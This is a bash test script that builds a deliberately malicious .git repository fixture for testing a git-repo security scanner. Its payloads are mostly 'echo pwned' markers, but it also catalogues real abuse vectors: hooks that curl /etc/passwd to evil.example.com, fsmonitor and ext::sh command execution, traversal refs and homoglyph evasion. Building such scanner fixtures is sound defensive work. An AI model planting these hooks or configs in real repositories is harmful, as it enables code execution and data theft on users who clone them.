#!/usr/bin/env bash
#
# Builds a malicious .git fixture for flynn e2e testing.
# Every check category from the README is represented here.
#
# Usage: ./test/setup_fixture.sh
# Output: test/fixtures/malicious_repo/
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE_DIR="$SCRIPT_DIR/fixtures/malicious_repo"

# wipe any previous run
rm -rf "$FIXTURE_DIR"
mkdir -p "$FIXTURE_DIR"

# bootstrap a real git repo so the object store is valid
git init "$FIXTURE_DIR" --quiet
echo "payload" > "$FIXTURE_DIR/README.md"
git -C "$FIXTURE_DIR" add README.md
git -C "$FIXTURE_DIR" commit -m "initial" --quiet

GIT="$FIXTURE_DIR/.git"

# ============================================================================
# 1. CONFIG-BASED COMMAND EXECUTION
# ============================================================================
git -C "$FIXTURE_DIR" config core.fsmonitor '!echo pwned-fsmonitor'
git -C "$FIXTURE_DIR" config core.sshCommand '!echo pwned-ssh'
git -C "$FIXTURE_DIR" config core.gitProxy '!echo pwned-proxy'
git -C "$FIXTURE_DIR" config core.editor '!echo pwned-editor'
git -C "$FIXTURE_DIR" config sequence.editor '!echo pwned-seqeditor'
git -C "$FIXTURE_DIR" config diff.external '!echo pwned-diff'
git -C "$FIXTURE_DIR" config diff.tool 'evil-diff'
git -C "$FIXTURE_DIR" config difftool.evil-diff.cmd '!echo pwned-difftool'
git -C "$FIXTURE_DIR" config merge.tool 'evil-merge'
git -C "$FIXTURE_DIR" config mergetool.evil-merge.cmd '!echo pwned-mergetool'
git -C "$FIXTURE_DIR" config credential.helper '!echo pwned-cred'
git -C "$FIXTURE_DIR" config pager.log '!echo pwned-pager'
git -C "$FIXTURE_DIR" config filter.evil.clean '!echo pwned-clean'
git -C "$FIXTURE_DIR" config filter.evil.smudge '!echo pwned-smudge'
git -C "$FIXTURE_DIR" config filter.evil.process '!echo pwned-process'
git -C "$FIXTURE_DIR" config gpg.program '!echo pwned-gpg'
git -C "$FIXTURE_DIR" config gpg.ssh.program '!echo pwned-gpg-ssh'
git -C "$FIXTURE_DIR" config gpg.x509.program '!echo pwned-gpg-x509'
git -C "$FIXTURE_DIR" config receive.procReceive '!echo pwned-procreceive'
git -C "$FIXTURE_DIR" config uploadpack.packObjectsHook '!echo pwned-packobjects'
git -C "$FIXTURE_DIR" config core.pager '!echo pwned-corepager'
git -C "$FIXTURE_DIR" config web.browser '!echo pwned-browser'
git -C "$FIXTURE_DIR" config sendemail.smtpserver '!echo pwned-smtp'

# include / includeIf — inject external config references
git config -f "$GIT/config" --add include.path '/tmp/evil-include.conf'
git config -f "$GIT/config" --add 'includeIf.gitdir:/tmp/evil/.path' '/tmp/evil-conditional.conf'

# core.hooksPath pointing to attacker-controlled absolute path
git -C "$FIXTURE_DIR" config core.hooksPath '/tmp/evil-hooks'

# transfer.fsckObjects (suspicious when combined with crafted objects)
git -C "$FIXTURE_DIR" config transfer.fsckObjects 'false'

# core.bare=false + core.worktree jailbreak pattern
git -C "$FIXTURE_DIR" config core.bare false
git -C "$FIXTURE_DIR" config core.worktree '/tmp/evil-worktree'

# multiple [core] sections — append a second one manually
cat >> "$GIT/config" <<'DUPECORE'

[core]
	fsmonitorv2 = !echo pwned-fsmonitorv2
DUPECORE

# ============================================================================
# 2. HOOK ABUSE
# ============================================================================
mkdir -p "$GIT/hooks"

# executable hooks with canonical names
for hook in pre-commit post-commit pre-push post-checkout post-merge \
            post-rewrite prepare-commit-msg commit-msg pre-rebase \
            pre-auto-gc post-update pre-receive update proc-receive \
            push-to-checkout fsmonitor-watchman p4-pre-submit \
            p4-prepare-changelist p4-changelist p4-post-changelist; do
    cat > "$GIT/hooks/$hook" <<'HOOKSCRIPT'
#!/bin/sh
echo "pwned via hook"
curl http://evil.example.com/exfil -d @/etc/passwd
HOOKSCRIPT
    chmod +x "$GIT/hooks/$hook"
done

# world-writable hook
chmod 0777 "$GIT/hooks/post-commit"

# unusual shebang hooks
cat > "$GIT/hooks/pre-commit" <<'PYHOOK'
#!/usr/bin/env python3
import os; os.system("echo pwned-python")
PYHOOK
chmod +x "$GIT/hooks/pre-commit"

cat > "$GIT/hooks/commit-msg" <<'NODEHOOK'
#!/usr/bin/env node
require('child_process').execSync('echo pwned-node');
NODEHOOK
chmod +x "$GIT/hooks/commit-msg"

cat > "$GIT/hooks/pre-push" <<'PERLHOOK'
#!/usr/bin/perl
system("echo pwned-perl");
PERLHOOK
chmod +x "$GIT/hooks/pre-push"

# hook that is a symlink pointing outside the repo
ln -sf /tmp/evil-hook-target "$GIT/hooks/post-merge"

# ============================================================================
# 3. STRUCTURAL ANOMALIES
# ============================================================================

# buried bare repo (OVE-20210718-0001)
BURIED="$FIXTURE_DIR/vendor/innocent-lib"
mkdir -p "$BURIED/objects" "$BURIED/refs/heads"
echo "ref: refs/heads/main" > "$BURIED/HEAD"
cat > "$BURIED/config" <<'BARECONF'
[core]
	repositoryformatversion = 0
	bare = false
	worktree = /tmp/evil-bare-worktree
BARECONF

# .git as a file (gitdir redirect) — create in a subdirectory
REDIR_DIR="$FIXTURE_DIR/subproject"
mkdir -p "$REDIR_DIR"
echo "gitdir: /tmp/evil-gitdir" > "$REDIR_DIR/.git"

# symlinks within .git/ pointing outside the repo
ln -sf /etc/passwd "$GIT/evil-symlink"

# unexpected subdirectory inside .git/
mkdir -p "$GIT/payload-staging"
echo "binary payload" > "$GIT/payload-staging/dropper.bin"

# ============================================================================
# 4. OBJECT STORE ANOMALIES
# ============================================================================
mkdir -p "$GIT/objects/pack" "$GIT/objects/info"

# oversized loose object (fake — 2MB of garbage in a plausible hash dir)
mkdir -p "$GIT/objects/de"
dd if=/dev/urandom of="$GIT/objects/de/adbeefdeadbeefdeadbeefdeadbeefdeadbeef" bs=1024 count=2048 2>/dev/null

# oversized pack file
dd if=/dev/urandom of="$GIT/objects/pack/pack-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pack" bs=1024 count=4096 2>/dev/null
touch "$GIT/objects/pack/pack-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.idx"

# crafted index file — abnormally large
dd if=/dev/urandom of="$GIT/index" bs=1024 count=512 2>/dev/null

# alternates — redirect object lookups to external path
echo "/tmp/evil-alternates/objects" > "$GIT/objects/info/alternates"

# http-alternates — remote object injection
echo "http://evil.example.com/repo.git/objects" > "$GIT/objects/info/http-alternates"

# ============================================================================
# 5. REFS AND HEAD ANOMALIES
# ============================================================================

# HEAD with raw SHA (detached)
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/HEAD"

# refs with path traversal characters
mkdir -p "$GIT/refs/heads"
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/refs/heads/..%2f..%2fetc%2fpasswd"

# ref pointing to non-existent object
echo "0000000000000000000000000000000000000000" > "$GIT/refs/heads/orphan-ref"

# packed-refs with suspicious ref name
cat > "$GIT/packed-refs" <<'PACKED'
# pack-refs with: peeled fully-peeled sorted
deadbeefdeadbeefdeadbeefdeadbeefdeadbeef refs/heads/main
cafebabecafebabecafebabecafebabecafebabe refs/heads/../../etc/shadow
PACKED

# leftover state files — interrupted operation indicators
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/FETCH_HEAD"
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/MERGE_HEAD"
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/CHERRY_PICK_HEAD"
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/REVERT_HEAD"
echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" > "$GIT/ORIG_HEAD"

# ============================================================================
# 6. GITATTRIBUTES ABUSE
# ============================================================================

# worktree .gitattributes — filter, diff, merge driver abuse
cat > "$FIXTURE_DIR/.gitattributes" <<'ATTRS'
* filter=evil
*.py diff=evil-diff
*.rs merge=evil-merge
Makefile filter=evil
*.sh filter=evil
*.go filter=evil
build.gradle filter=evil
CMakeLists.txt filter=evil
*.py eol=lf filter=evil
*.md export-subst
*.txt ident
ATTRS

# .git/info/attributes — same thing but inside .git
mkdir -p "$GIT/info"
cat > "$GIT/info/attributes" <<'GITATTRS'
* filter=backdoor
*.py diff=steal
*.rs merge=trojan
GITATTRS

# ============================================================================
# 7. WORKTREE AND ALTERNATES
# ============================================================================
mkdir -p "$GIT/worktrees/evil-tree"
echo "/tmp/sensitive-location" > "$GIT/worktrees/evil-tree/gitdir"
echo "/tmp/evil-commondir" > "$GIT/worktrees/evil-tree/commondir"

mkdir -p "$GIT/worktrees/second-tree"
echo "/etc" > "$GIT/worktrees/second-tree/gitdir"
echo "../../" > "$GIT/worktrees/second-tree/commondir"

# ============================================================================
# 8. SUBMODULE ABUSE
# ============================================================================

# .gitmodules in worktree with every malicious pattern
cat > "$FIXTURE_DIR/.gitmodules" <<'SUBMOD'
[submodule "legit-looking"]
	path = vendor/legit-looking
	url = file:///etc/passwd
	update = !echo pwned-submodule-update

[submodule "ext-proto"]
	path = vendor/ext-proto
	url = ext::sh -c echo% pwned-ext

[submodule "fd-proto"]
	path = vendor/fd-proto
	url = fd::17/vendor/fd-proto

[submodule "traversal"]
	path = ../../../tmp/evil-submodule
	url = https://github.com/example/repo.git
SUBMOD

# nested malicious repo inside .git/modules/
NESTED="$GIT/modules/legit-looking"
mkdir -p "$NESTED/objects" "$NESTED/refs/heads" "$NESTED/hooks"
echo "ref: refs/heads/main" > "$NESTED/HEAD"
cat > "$NESTED/config" <<'NESTEDCONF'
[core]
	repositoryformatversion = 0
	bare = false
	fsmonitor = !echo pwned-nested-fsmonitor
	sshCommand = !echo pwned-nested-ssh
[remote "origin"]
	url = ext::sh -c echo% pwned-nested-remote
NESTEDCONF
cat > "$NESTED/hooks/post-checkout" <<'NESTEDHOOK'
#!/bin/sh
echo "pwned from nested submodule hook"
NESTEDHOOK
chmod +x "$NESTED/hooks/post-checkout"

# ============================================================================
# 9. INFO AND METADATA
# ============================================================================

# sparse-checkout with unusual patterns
cat > "$GIT/info/sparse-checkout" <<'SPARSE'
/*
!.git
/etc/passwd
/tmp/*
../../sensitive/**
SPARSE

# exclude file — attacker hiding tracks
cat > "$GIT/info/exclude" <<'EXCLUDE'
*.payload
*.exfil
.backdoor/
dropper*
EXCLUDE

# tampered description
echo "This repo has been modified by an advanced persistent threat." > "$GIT/description"

# suspicious user section + remotes in config (append to existing)
cat >> "$GIT/config" <<'METACONF'

[user]
	name = Definitely Not An Attacker
	email = attacker@evil.example.com

[remote "origin"]
	url = https://github.com/example/legit-repo.git
	pushurl = https://evil.example.com/exfil-repo.git
	fetch = +refs/heads/*:refs/remotes/origin/*

[remote "exfil"]
	url = ext::sh -c echo% pwned-remote-ext
	fetch = +refs/heads/*:refs/remotes/exfil/*

[remote "local-steal"]
	url = file:///etc/shadow
	fetch = +refs/heads/*:refs/remotes/local-steal/*

[remote "fd-remote"]
	url = fd::17/foo
	fetch = +refs/heads/*:refs/remotes/fd-remote/*
METACONF

# ============================================================================
# 10. ENCODING AND EVASION
# ============================================================================

# append encoding tricks to config
cat >> "$GIT/config" <<'EVASION'

[core]
	# tab indentation trick — the key below has a leading tab
	 	fsmonitor = !echo tab-indented-exec

[cоre]
	editor = !echo homoglyph-core-with-cyrillic-o

EVASION

# null byte in a config value — write with printf
printf '[evasion]\n\tnullval = before\x00after\n' >> "$GIT/config"

# extremely long config value
printf '[evasion]\n\tlongval = ' >> "$GIT/config"
python3 -c "print('A' * 100000, end='')" >> "$GIT/config"
printf '\n' >> "$GIT/config"

# shell metacharacters in non-exec fields
cat >> "$GIT/config" <<'SHELLMETA'

[user]
	name = $(echo pwned)
	email = `whoami`@$(hostname).evil.com

[branch "main"]
	description = ; rm -rf / #
SHELLMETA

# binary content injected into config
printf '\n[binary]\n\tpayload = \x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' >> "$GIT/config"

# ============================================================================
# DONE
# ============================================================================
echo ""
echo "fixture built: $FIXTURE_DIR"
echo ""
echo "category breakdown:"
find "$FIXTURE_DIR" -name '.git' -prune -o -print | head -5
echo "  .git/config:      $(wc -l < "$GIT/config") lines"
echo "  .git/hooks:       $(ls "$GIT/hooks" | wc -l) hooks"
echo "  .git/refs:        $(find "$GIT/refs" -type f | wc -l) refs"
echo "  .git/worktrees:   $(ls "$GIT/worktrees" | wc -l) worktrees"
echo "  .git/modules:     $(find "$GIT/modules" -maxdepth 1 -mindepth 1 -type d | wc -l) submodules"
echo "  .git/objects:     $(du -sh "$GIT/objects" | cut -f1) objects dir"
echo "  buried bare repo: vendor/innocent-lib/"
echo "  gitdir redirect:  subproject/.git"
echo "  .gitattributes:   $(wc -l < "$FIXTURE_DIR/.gitattributes") rules"
echo "  .gitmodules:      $(wc -l < "$FIXTURE_DIR/.gitmodules") lines"
